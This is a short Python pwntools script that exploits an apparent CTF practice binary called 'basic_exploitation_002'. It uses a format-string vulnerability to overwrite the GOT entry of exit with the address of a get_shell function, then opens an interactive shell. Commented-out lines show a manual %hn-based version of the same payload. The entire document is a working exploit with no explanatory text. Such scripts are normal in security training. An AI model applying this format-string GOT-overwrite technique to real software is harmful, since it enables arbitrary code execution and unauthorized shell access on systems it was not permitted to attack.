from pwn import *

#context.log_level="debug"
p=process('basic_exploitation_002')
#p=process('basic_exploitation_002')
e=ELF('basic_exploitation_002')
exit_got=e.got['exit']
get_shell=e.symbols['get_shell']
payload=""

# esp = buf - 0x4
# esp + 0x88

# 0x80 + 0x4 + ret 
# 0x8048609 = 0x0804 , 0x8609
log.info("exit got addr: "+hex(exit_got))
log.info("get_shell addr: "+hex(get_shell))

pause()

payload=fmtstr_payload(1,{exit_got:get_shell})
log.info("payload: "+payload)

#payload+=p32(exit_got+2)
#payload+=p32(exit_got)
#payload+="%2044c"
#payload+="%1$hn"
#payload+="%32261c"
#payload+="%2$hn"
#raw_input()
#sleep(3)
p.sendline(payload)
#raw_input()
p.interactive()
